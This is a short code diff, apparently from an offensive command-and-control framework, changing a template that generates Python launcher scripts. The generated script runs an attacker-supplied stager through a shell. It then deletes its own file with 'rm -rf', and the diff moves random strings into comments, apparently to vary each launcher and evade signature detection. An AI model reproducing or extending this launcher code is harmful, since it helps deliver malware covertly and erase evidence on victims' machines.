@@ -13,7 +13,11 @@ class Launcher(LauncherABC):
         # -*- coding: utf-8 -*-
         import subprocess
         
-        {} = "{}"
+        #
+        #{}
+        #"{}"
+        #
+
         subprocess.Popen("{}", shell=True)
         subprocess.Popen("rm -rf " + __file__, shell=True)
         """).format(random_string(), random_string(numbers=True), stager.replace('"', '\\"')))
